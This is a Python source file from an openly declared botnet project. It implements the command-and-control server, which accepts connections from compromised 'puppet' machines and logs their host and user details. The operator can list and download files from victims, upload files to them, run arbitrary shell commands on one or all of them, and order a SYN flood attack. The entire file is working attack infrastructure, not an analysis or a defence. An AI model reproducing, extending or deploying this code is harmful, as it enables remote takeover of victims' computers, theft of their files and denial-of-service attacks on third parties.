"""
    MIT License
    Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>

    This module belongs to https://github.com/arthur-bryan/puppeteer
    A implementation of a botnet using Python on server (C&C) side
    and C on the puppets side.

    This module contains the class that represents the Puppeteer, with the
    responsible methods for accepting incoming puppet connections and
    interacting with the them
"""

from time import sleep
import threading
import socket
import os
import sys
import struct
from config import MAX_COMMAND_OUTPUT_SIZE
from config import to_yellow, to_green, to_red
from classes.database import Database
from classes.puppet import Puppet


class Puppeteer:
    """ Class that represents the C&C server, which send commands to puppets and
        receives its responses

    Attributes:
        __database (Database):      object to interact with database
        __listen_address (str):     IP address of the listening interface
        __listen_port (int):        port number for incoming puppet connections
        __socket (:obj: 'socket'):  object with socket methods

    """

    def __init__(self, listen_address, listen_port, database_path):
        """Args:
                listen_address (str):   IP address of the listening interface
                listen_port (int):      port number for puppet connections

        """
        self.__database = Database(database_path)
        self.__listen_address = listen_address
        self.__listen_port = listen_port
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__socket.bind((self.__listen_address, self.__listen_port))
        self.__connected_puppets = []
        _load_animation()

    def __str__(self):
        """ String representation of the Puppeteer object

            Returns:
                str:    representation of the server with its listening address

        """
        return f"C&C Puppeteer {self.__listen_address}:{self.__listen_port}"

    def start(self):
        """ Starts the thread for listening connections and shows the server
            control panel

        """
        try:
            threading.Thread(target=self._listen_connections_thread).start()
            self._control_panel()
        except KeyboardInterrupt:
            self.exit()

    def _listen_connections_thread(self):
        """ The thread for listening and accepting incoming connections and
            adding puppets to the database

        """
        while True:
            self.__socket.listen(32)
            client_socket, client_address = self.__socket.accept()
            puppet = Puppet(client_socket, client_address[0])
            self._add_puppet_to_database(puppet)
            if puppet.id_hash not in self._get_connected_puppets_hashes():
                self.__connected_puppets.append(puppet)
                print(to_green(f"\n[ + ] Got connection: "
                               f"{puppet.ip_address}\n"))

    def _get_connected_puppets_hashes(self):
        """ Returns a list with the hashes of puppets connected to the server

            Returns:
                (:obj: 'list'):     list of the hashes of connected puppets

        """
        return [puppet.id_hash for puppet in self.__connected_puppets]

    def _add_puppet_to_database(self, new_puppet):
        """ Adds the puppet to the database if it is not yet, update
            its information otherwise

            Args:
                new_puppet (:obj: 'Puppet'):  puppet to be added or updated on
                    database

        """
        if new_puppet.id_hash in self.__database.get_puppets_hashes():
            self.__database.update_all_puppet_info(new_puppet)
        else:
            self.__database.add_puppet(new_puppet)

    def _control_panel(self):
        """ Shows a menu and starts communication based on the chosen option"""
        _main_menu()
        while True:
            command_number = input(to_yellow("[ COMMAND OPTION ] >> "))
            if command_number == '0':
                self._list_connections()
            elif command_number == '1':
                self._interact_with_one()
            elif command_number == '2':
                self._interact_with_all()
            elif command_number == '3':
                sys.exit(0)
            elif command_number in ('help', '--help', 'h', '-h', '--h'):
                _main_menu()
            # else:
            #     print(to_red("[ ! ] Invalid choice, use 'help'"))

    def _interact_with_one(self):
        """ Shows a menu to interact with a chosen puppet (if there is any
            puppet connected)

        """
        if not self.__connected_puppets:
            print(to_red("\n[ - ] There is no puppet connected\n"))
            return
        puppet = self._choose_puppet_from_list()
        while True:
            _interaction_menu()
            try:
                command_number = input(to_yellow("[ UNICAST ] >> "))
                if command_number == '0':
                    self.__database.update_puppet_status(puppet, new_status=0)
                    puppet.disconnect()
                    self.__connected_puppets.remove(puppet)
                    return
                elif command_number == '1':
                    puppet.list_files()
                elif command_number == '2':
                    puppet.send_file()
                elif command_number == '3':
                    puppet.receive_file()
                elif command_number == '4':
                    command = input(to_yellow("[ SHELL COMMAND ] Command: "))
                    puppet.run_command(command)
                elif command_number == '5':
                    puppet.syn_flood()
                elif command_number == '9':
                    return
                elif command_number in ('help', '--help', 'h', '-h', '--h'):
                    _interaction_menu()
                else:
                    print(to_red("[ ! ] Invalid choice, use 'help'"))
            except socket.error as error:
                self.__database.update_puppet_status(puppet, new_status=0)
                self.__connected_puppets.remove(puppet)
                print(to_red(f"\n[{puppet.ip_address}] {error}\n"))
                return

    def _interact_with_all(self):
        """ Show a menu to interact with all puppets (if there is any puppet
            connected)

        """
        if len(self.__connected_puppets) == 0:
            print(to_red("\n[ - ] There is no puppet connected\n"))
            return
        while True:
            _interaction_menu()
            try:
                command_number = input(to_yellow("[ BROADCAST ] >> "))
                if command_number == '0':
                    self._disconnect_all_puppets()
                    return
                elif command_number == '1':
                    self._list_files_for_all()
                elif command_number == '2':
                    self._download_from_all()
                elif command_number == '3':
                    self._upload_to_all()
                elif command_number == '4':
                    command = input(to_yellow("[ SHELL COMMAND ] Command: "))
                    for puppet in self.__connected_puppets:
                        puppet.run_command(command)
                elif command_number == '5':
                    for puppet in self.__connected_puppets:
                        puppet.syn_flood()
                elif command_number == '9':
                    return
                elif command_number in ('help', '--help', 'h', '-h', '--h'):
                    _interaction_menu()
                else:
                    print(to_red("\n[ ! ] Invalid choice, use 'help'\n"))
            except socket.error as error:
                print(to_red(f"\n[ - ] {error}\n"))

    def _list_connections(self):
        """ Lists the connected puppets """
        if self.__connected_puppets:
            print(to_green(
                f"{'ACTIVE CONNECTIONS'.center(67,'=')}\n\n"
                f"{'ID':^6}{'IP ADDRESS':^15}"
                f"{'OS':^10}{'ARCH':^8}"
                f"{'HOST':^12}{'USER':^12}\n"))
            for _, puppet in enumerate(self.__connected_puppets):
                print(f"{_:^6}{puppet.ip_address:^15}{puppet.op_system:^10}"
                      f"{puppet.architecture:^12}{puppet.hostname:^12}"
                      f"{puppet.username:^12}")
            print()
        else:
            print(to_red("\n[ - ] There is no puppet connected\n"))

    def _disconnect_all_puppets(self):
        for puppet in self.__connected_puppets:
            try:
                puppet.disconnect()
            except socket.error as error:
                print(to_red(f"\n[{puppet.ip_address}] {error}\n"))
            else:
                self.__database.update_puppet_status(puppet, new_status=0)
        self.__connected_puppets.clear()

    def _choose_puppet_from_list(self):
        """ Choose a puppet based on it index on the list of connected puppets

            Returns:
                :obj: 'Puppet':    chosen puppet

        """
        self._list_connections()
        while True:
            try:
                puppet_id = int(input(to_yellow("[ INTERACT ] Puppet ID: ")))
                return self.__connected_puppets[puppet_id]
            except (ValueError, IndexError):
                print(to_red("\n[ ! ] Invalid choice\n"))
                continue

    def _list_files_for_all(self):
        """ Lists the files of specified path on all connected puppets """
        individual_percentage = 100 / len(self.__connected_puppets)
        total_success_percentage = 0
        directory = input(to_yellow("[ LIST FILES ] Path: "))
        for puppet in self.__connected_puppets:
            try:
                puppet.socket_fd.send(bytes("list files", 'utf-8'))
                puppet.socket_fd.send(bytes(directory, 'utf-8'))
                output = puppet.socket_fd.recv(MAX_COMMAND_OUTPUT_SIZE)
                output = output.decode('utf-8')
                total_success_percentage += individual_percentage
                print(to_green(f"\n[ {total_success_percentage:.1f}% ]" +
                               f"[ Output for {puppet.ip_address}:"
                               f"{directory} ]"))
                print(f"{output}")
            except socket.error as error:
                self.__database.update_puppet_status(puppet, new_status=0)
                self.__connected_puppets.remove(puppet)
                print(to_red(f"[ {puppet.ip_address} ] {error}\n"))
                continue
        print(to_green(f"[ Success: {total_success_percentage:.1f}% ] "))

    def _download_from_all(self):
        """ Downloads specified file from de puppets and saves to a specified
            output path

        """
        remote_file_path = input(to_yellow("[ DOWNLOAD ] Path to file: "))
        local_filename = input(to_yellow("[ DOWNLOAD ] Save as: "))
        if os.path.exists(local_filename):
            print(to_red("\n[ ! ] Invalid output path\n"))
            return
        if remote_file_path in ("",) or remote_file_path in ("",):
            return
        individual_percentage = 100 / len(self.__connected_puppets)
        total_success_percentage = 0
        for puppet in self.__connected_puppets:
            output_file_name = f'{puppet.ip_address}' + local_filename
            if os.path.exists(output_file_name):
                print(to_red(f"\n[ ! ] File exists: {output_file_name}\n"))
                return
            puppet.socket_fd.send(bytes("upload", 'utf-8'))
            puppet.socket_fd.send(bytes(remote_file_path, 'utf-8'))
            file_size = puppet.socket_fd.recv(256)
            file_size = int.from_bytes(file_size, "little")
            file_data = puppet.recv_all(file_size)
            try:
                with open(output_file_name, "wb") as file:
                    file.write(file_data)
                    file.close()
                    total_success_percentage += individual_percentage
                    print(to_green(f"\n[ {total_success_percentage:.1f}% ] "
                                   f"{output_file_name} downloaded from "
                                   f"{puppet.ip_address}\n"))
            except socket.error as error:
                self.__database.update_puppet_status(puppet, new_status=0)
                self.__connected_puppets.remove(puppet)
                print(to_red(f"[ {puppet.ip_address} ] {error}"))
                return
            except Exception as error:
                print(to_red(f"\n[ ! ] Can't write to file: {error}\n"))
        print(to_green(f"[ Success: {total_success_percentage:.1f}% ] "))

    def _upload_to_all(self):
        """ Uploads a specified file to all puppets at a specified path """
        source_path = input(to_yellow("[ UPLOAD ] Source path: "))
        destination_path = input(to_yellow("[ UPLOAD ] Destination path: "))
        if source_path == "" or destination_path == "":
            return
        if not os.path.exists(source_path):
            print(to_red(f"\n[ ! ] File doesn't exists: {source_path}\n"))
            return
        individual_percentage = 100 / len(self.__connected_puppets)
        total_success_percentage = 0
        file_size = os.path.getsize(source_path)
        file_size = struct.pack(">I", socket.htonl(file_size))
        for puppet in self.__connected_puppets:
            try:
                with open(source_path, "rb") as file:
                    puppet.socket_fd.send(bytes("download", 'utf-8'))
                    puppet.socket_fd.send(file_size)
                    len_filename = len(destination_path)
                    len_filename = struct.pack(">I", socket.htonl(len_filename))
                    puppet.socket_fd.send(len_filename)
                    puppet.socket_fd.send(bytes(destination_path, 'utf-8'))
                    file_data = file.read()
                    puppet.socket_fd.sendall(file_data)
                    file.close()
                    total_success_percentage += individual_percentage
                    print(to_green(
                        f"\n[ {total_success_percentage:.1f}% ] "
                        f"{source_path} uploaded to {puppet.ip_address}"))
            except socket.error as error:
                self.__database.update_puppet_status(puppet, new_status=0)
                self.__connected_puppets.remove(puppet)
                print(to_red(f"\n[ {puppet.ip_address} ] {error}\n"))
                return
        print(to_green(f"[ Success: {total_success_percentage:.1f}% ]"))

    def exit(self):
        """ Clear connections list, sets the puppets status to 0 on database
            then exits the program with exit code 0

        """
        self.__database.disconnect_puppets_on_exit()
        self.__connected_puppets.clear()
        sys.exit(0)


def _load_animation():
    """ Shows a simple loading animation """
    for _ in range(65):
        print(to_green('/'), end='')
        sys.stdout.flush()
        sleep(0.01)
    print()


def _main_menu():
    """ Prints the main menu """
    print(to_yellow(
        "\n[0] List connected puppets\n" +
        "[1] Interact with one\n" +
        "[2] Interact with all\n" +
        "[3] Exit\n"))


def _interaction_menu():
    """ Prints the interactive menu """
    print(to_yellow(
        "\n[0] Disconnect\n" +
        "[1] List files\n" +
        "[2] Download from puppet\n" +
        "[3] Upload to puppet\n" +
        "[4] Run remote command\n"
        "[5] SYN Flood attack\n"
        "[9] Back\n"))
